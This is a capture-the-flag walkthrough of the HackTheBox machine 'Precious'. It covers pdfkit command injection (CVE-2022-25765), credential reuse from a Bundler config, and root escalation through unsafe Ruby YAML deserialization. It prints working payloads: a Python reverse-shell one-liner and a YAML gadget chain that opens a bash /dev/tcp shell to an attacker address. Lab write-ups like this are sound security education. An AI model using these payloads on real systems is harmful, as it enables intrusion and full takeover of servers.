# HackTheBox — Precious

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / pdfkit SSTI / Ruby YAML deserialization  
**Status:** Retired  

---

## Summary

Precious is a Linux machine running a Ruby web app that converts URLs to PDFs using **pdfkit**. The outdated pdfkit version is vulnerable to a command injection via URL parameter (CVE-2022-25765). Privilege escalation abuses a root-owned Ruby script that deserializes a YAML file writable by the current user.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/precious 10.10.11.189
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1
80/tcp open  http    nginx 1.18.0
```

Add to `/etc/hosts`:

```
10.10.11.189  precious.htb
```

---

## Web Enumeration

Visiting `http://precious.htb` shows a page-to-PDF converter. It accepts a URL and fetches it.

### Fingerprinting the PDF

Generate a PDF from a URL (e.g., your own HTTP server) and inspect it:

```bash
# Host a simple page
python3 -m http.server 8000

# Fetch via the web app
# Download the resulting PDF, then inspect metadata
exiftool output.pdf
```

```
Creator: pdfkit v0.8.6
```

**pdfkit 0.8.6** — vulnerable to CVE-2022-25765.

---

## Exploitation

### CVE-2022-25765 — pdfkit Command Injection

pdfkit 0.8.6 fails to sanitize URL parameters. A specially crafted URL containing a `%20` followed by a shell command will execute on the server:

```
http://10.10.14.X:8000/?name=%20`id`
```

For a reverse shell:

```bash
# Start listener
nc -lvnp 4444

# Submit this URL to the converter
http://10.10.14.X:8000/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.X",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
```

Shell as **ruby**.

---

## Lateral Movement — ruby → henry

Check the home directory of ruby user:

```bash
find /home -name "*.cfg" -o -name "*.yml" -o -name "*.conf" 2>/dev/null
cat /home/ruby/.bundle/config
```

```yaml
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

SSH as henry:

```bash
ssh henry@10.10.11.189
# Password: Q3c1AqGHtoI0aXAYFH
```

---

## User Flag

```bash
cat /home/henry/user.txt
```

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

### Analyzing the Script

```bash
cat /opt/update_dependencies.rb
```

```ruby
require "yaml"
require 'rubygems'
require 'bundler'

YAML.load(File.read("dependencies.yml"))
```

The script reads `dependencies.yml` from the **current directory** and deserializes it with `YAML.load` — which is unsafe and allows arbitrary object instantiation in Ruby.

### Ruby YAML Deserialization — Gadget Chain

Create a malicious `dependencies.yml`:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/proc 'lambda { |s| `bash -c "bash -i >& /dev/tcp/10.10.14.X/5555 0>&1"` }'
                 method_id: :call
         git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.X/5555 0>&1'"
```

Start a listener:

```bash
nc -lvnp 5555
```

Execute:

```bash
cd /tmp  # or any writable directory with the yml file
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

**Root shell obtained.**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- Check PDF/document metadata — `exiftool` reveals the generating library and version
- `pdfkit` and similar URL-to-document converters often blindly pass input to CLI tools
- `.bundle/config` stores Bundler credentials in plaintext — always check it
- `YAML.load` in Ruby is unsafe — it can instantiate arbitrary objects including gadget chains
- Ruby YAML deserialization gadget chains are well-documented — search for the latest PoC

---

## CVE References

- **CVE-2022-25765** — pdfkit 0.8.6 Command Injection

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| exiftool | PDF metadata inspection |
| netcat | Reverse shell listener |
| ssh | Lateral movement |
| YAML gadget chain | Ruby deserialization privesc |
